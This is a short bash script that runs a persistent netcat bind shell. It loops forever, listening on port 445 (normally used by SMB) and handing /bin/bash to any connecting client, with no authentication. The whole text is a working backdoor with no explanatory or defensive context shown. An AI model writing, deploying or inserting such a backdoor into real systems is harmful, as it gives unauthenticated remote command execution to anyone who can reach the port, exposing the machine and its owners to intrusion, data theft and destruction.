#!/bin/bash 
while [ 1 ]; do
    echo -n | netcat  -l -v -p 445 -e /bin/bash
done
